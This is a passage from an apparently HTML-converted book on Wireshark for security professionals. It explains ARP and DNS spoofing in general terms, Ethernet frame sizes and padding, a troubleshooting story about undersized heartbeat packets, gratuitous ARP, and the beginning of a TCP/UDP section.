what IP address associates to a known domain name (sampleURL.com </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >or </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >mailserver.corporate.com).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For both ARP and DNS, requests and replies happen without authentication, without validation, and far too often to watch over manually. For performance reasons, any new information is typically saved, even overwriting valid, nonexpired information. So, spoofing is far too easy. Thankfully, tools do exist to detect spoofing nearly as easily.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In </span><span><a href="#_bookmark455" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 6</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >we use Wireshark to follow along the sequence and timing of the attacks and how to detect them.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark217" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Packet and Protocol Analysis" ></a>Packet and Protocol Analysis</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Earlier in the chapter, we rehashed the OSI model and its seven layers. Those layers, or levels of abstraction, then provide an example workflow, as data (a picture file) works through the layers, from the application to the wire. Even though the concepts should already be fairly familiar, the model itself stays fairly abstract until now.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With regard to protocol analysis, it is essential to keep your</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section107" ><p class=MsoBodyText  style="margin-top:3.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >understanding sharp. For most security professionals, while the OSI model is well understood, it still remains abstract to most job tasks. As said in an earlier section, in Wireshark the OSI layers are clearly denoted by the packet details.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:8.1000pt;" ><a name="_bookmark218" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With respect to the OSI layers, it&#8217;s then helpful to have a quick appreciation for how physically close (or distant) layers 2 and 3 are for the packets you&#8217;re inspecting. Layer 2 is obviously the MAC address, while layer 3 is the IP address. And which part of this packet tells you where the capture was collected? Do you recall the workflow example earlier, when we highlighted the IP destination and source addresses, asking where the packet is ultimately going to and coming from? As a packet hops from router to router, IP addresses don&#8217;t change. But with every hop, the MAC addresses do. And with every subsequent hop, the router will request to find out (or its cache already knows) which next MAC address will bring this packet closer to its final destination. So, keeping layers 2 and 3 addressing in mind, which one is more local, and which one is more global? Yes, the layer 2 address is just concerned with the local subnet, while the layer 3 addressing stays consistent from source to destination. The one exception being NAT, where, true to its name, the network addressing is translated or changed across that boundary.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:13.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >A Protocol Analysis Story</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When it comes to using Wireshark, you often use it to prove what the problem is </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >not</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Like when developers (or their managers) complain the network is intermittent. Or worse, when someone suspects the fault to be network RFC standards, as demonstrated by some newly developed application.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:7.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Typically, when a new application suggests a stable network is broken, the fault is likely not the network hardware, right? Tread lightly and be ready with Wireshark. Plus, here is an example of how important it is to gather as much information as you can first.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  align=justify  style="margin-top:7.6500pt;margin-right:23.6500pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s say the application developers tell you they coded a new way to send &#8220;heartbeat&#8221; checks between cluster server nodes. They add you should be grateful because their packets are a record-thin size of</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >just</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section108" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:8.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >30 bytes, saving valuable network bandwidth. (Wow, thanks!) But, they add, something&#8217;s wrong and it seems your network is broken. The heartbeat packets are not traversing the network.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Because you&#8217;re familiar with Ethernet enough to know layer 2 frames are typically a minimum 64 octets, you already have doubts about this bandwidth saver.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:37.2000pt;margin-left:30.5000pt;text-indent:-22.5000pt;line-height:145%;" ><span style="position:absolute;z-index:-1;margin-left:133.0833px;margin-top:64.9167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker136258.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As a refresher, Ethernet frames at layer 2 include (with # of bits): A preamble (56 bits = 7 octets)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:11.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker136360.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A start frame delimiter (8 bits = 1 octet)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:135.5500pt;margin-left:30.5000pt;line-height:145%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.9167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker136404.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:65.1667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker136405.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:106.4167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker136406.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A destination MAC address (48 bits = 6 octets) A source MAC address (48 bits = 6 octets) Length/Type field (16 bits = 2 octets)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:52.5000pt;margin-left:30.5000pt;line-height:145%;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:11.1667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker136535.png" ></span><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:52.4167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker136536.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Stuf<a name="_bookmark219" ></a>f inside the layer 2 frame (remaining 46 to 1500 octets) Pad: zeros to fill if needed</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:11.0833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker136627.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Frame Check Sequence or FCS (32 bits = 4 octets)</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Wireshark capture engine includes the information at layer 2. However, it picks up neither the preamble nor the FCS. For outbound frames, Wireshark gets it before the FCS is appended. For inbound frames, Wireshark gets the frame after the FCS is stripped off.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Going deeper down the rabbit hole, Wireshark picks up these frames differently, depending on whether they are leaving (outbound) or being received (inbound).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >In<a name="_bookmark220" ></a>&nbsp;</span><span><a href="#_bookmark221" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-4</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the packet&#8217;s size can be seen in a few places&#8212;under the length column in the Packet List pane and in the first subtree in the Packet Details pane.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section109" ><p class=MsoBodyText ><img width="781"  height="378"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker137294.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark221" ></a><span><a href="#_bookmark220" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-4:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Small Incoming Layer 2 frame</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >For small incoming packets, an ARP request in this case and the data alone do not satisfy the minimum 64-byte size, so padding is added. Notice also the preamble and SFD are already stripped off. The destination MAC address bits (highlighted) are the first bits shown in the Packet Bytes pane. Given the Ethernet padding of 18 bytes, this frame is shown as &#8220;60 bytes on the wire.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Compare that to<a name="_bookmark222" ></a>&nbsp;</span><span><a href="#_bookmark223" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-5</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, where this outgoing packet is still smaller, &#8220;54 bytes on the wire.&#8221; How does that happen? For outbound frames, Wireshark gets it before the FCS is appended. And Wireshark picks it up before any padding is put on (to meet that frame length minimum).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section110" ><p class=MsoBodyText ><img width="781"  height="378"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker138062.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark223" ></a><span><a href="#_bookmark222" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-5:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Smaller outgoing Layer 2 frame</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >So, for this outgoing packet (a tiny TCP packet) Wireshark sees the length as only 54 octets. Padding is added before the frame goes on the wire. The FCS is calculated, and the frame is sent off.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.8000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >Recalling CSMA/CD</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:8.9500pt;" ><a name="_bookmark224" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We are still working through our protocol analysis story. But</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >suddenly, something hits you from when you studied networking long ago, particularly about Ethernet technology. You remembered something called </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >Carrier Sense Multiple Access / Collision Detection </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >(CSMA/CD). Although CSMA/CD is buried in your memory, you remember it was about network cards negotiating so that bits on the wire do not bump into each other. Oh, by the way, Wireshark does not capture or present that auto-negotiation traffic, so no troubleshooting help there. But you recalled CSMA/CD, because when a frame is less than 64 octets long, the receiving network device assumes it to be just a fragment and evidence of a collision. Remember what is done with those fragments? They are</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.3000pt;font-size:15.0000pt;" >&nbsp;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >discarded</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >So, you have all the preliminary information you can gather, and you are armed with your knowledge and practice. Now is a good time to fire up Wireshark. Considering the size of the heartbeat packets, you feel they might not be considered valid when received on a machine,</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section111" ><p class=MsoNormal  style="margin-top:3.9500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >so you decide to run Wireshark on a system to capture the packets </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >as they are sent out</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Sure enough, Wireshark sees the packets being sent out. Of course, the protocol is not understood by any dissectors (we discuss them later), but you see the tiny frames, complete with correct layer 2 information.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You confirm your suspicion by now capturing traffic along the way, and then on the machine, which should be receiving the heartbeat packets. But no, it isn&#8217;t.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:9.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >What&#8217;s the solution for application developers? Insert enough padding into their homegrown packets. Zeros work fine, but they provide enough padding in <a name="_bookmark225" ></a>order to increase the frame to the minimum Ethernet size of 64 octets (shown as 54 octets on the wire when you test again). Provided that the rest of the development works, the packet should continue along the network to its intended destination.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >The Rare Smoking Gun</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >That previous example went pretty smoothly&#8212;maybe too smoothly, given the beginning hints.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You know already you can&#8217;t count on real-life analysis flowing so linearly. You will naturally, like any person, have evolving notions of what&#8217;s going on, what might be wrong, what to look for next, and what to disregard. As an analyst in any field with any investigative tool, your bigger challenge will be to keep track of what notions can safely be ruled out and where next to dig deeper.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:6.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Generally, experience pays off, but it can also introduce bias, which isn&#8217;t so helpful. While you analyze traffic in Wireshark, your judgment can and will get challenged by what you see. When you are reading through packets, your own experience, knowledge, and biases greatly influence how you interpret the list of packets. This happens to both the person new to Wireshark and veteran packet analysts. The chief difference between a new analyst and the one with years of experience is that the experienced analyst does not expect to find the &#8220;smoking gun&#8221; without being distracted a few times by other discoveries. It&#8217;s simply too rare to find the root of the problem quickly or to find it with just one capture, from one location.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section112" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:9.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >See<a name="_bookmark226" ></a>&nbsp;</span><span><a href="#_bookmark227" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-6</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >for an example. Wireshark captured a gratuitous ARP packet. A gratuitous ARP packet may be an ARP request or ARP reply. After our talk about ARP spoofing, seeing a gratuitous ARP should likely draw suspicion. And let&#8217;s say you saw this plus other packets like it in a trace while investigating the legitimate service repeatedly offline. Maybe this packet appears to be the smoking gun, but, in most networks, gratuitous ARPs come from a list of reasons. For example, a cluster node changes IPs, a desktop discovers a duplicate IP, or even when workstations reboot, informing everyone that MAC is back up.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="120"  height="0" ></td></tr><tr><td></td><td><img width="781"  height="371"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker142144.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.5500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark227" ></a><span><a href="#_bookmark226" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-6:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Gratuitous ARP</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:21.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >It&#8217;s more common to need traffic captured from a few different spots in the network, especially when diagnosing problems related to connectivity, performance, or other problems you can&#8217;t categorize until you dig into them. Imagine clients having trouble with an application server. They ask you to investigate. Just in the early question-and-answer session, you learn there is a web front-end, a middle-tier, and a back-end database server. Where is the problem? Yup, you&#8217;ll likely be launching Wireshark in a few spots.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Ports and Protocols</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><a name="_bookmark228" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Moving up the networking stack, you come to the transport layer. Perhaps the most well-known parts of the transport layer are the well-</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section113" ><p class=MsoBodyText  style="margin-top:3.5000pt;margin-right:6.3500pt;line-height:101%;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >known port numbers and the two popular protocols that service them. A few words about these and how they relate in Wireshark will be helpful.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h4 style="margin-top:14.5000pt;" ><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" >TCP and UDP</span></i></b><b><i><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-style:italic;font-size:15.0000pt;" ><o:p></o:p></span></i></b></h4><p class=MsoBodyText  style="margin-top:7.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Both TCP and UDP are used to relay messages, rely on a source port and destination port (creating a socket at that instance), and perform some level of error checking. Apart from that, the two message protocols are very different.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Do you remember some of those key differences?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.9167px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker143315.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >TCP first creates a connection before any message is sent, whereas UDP does not.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  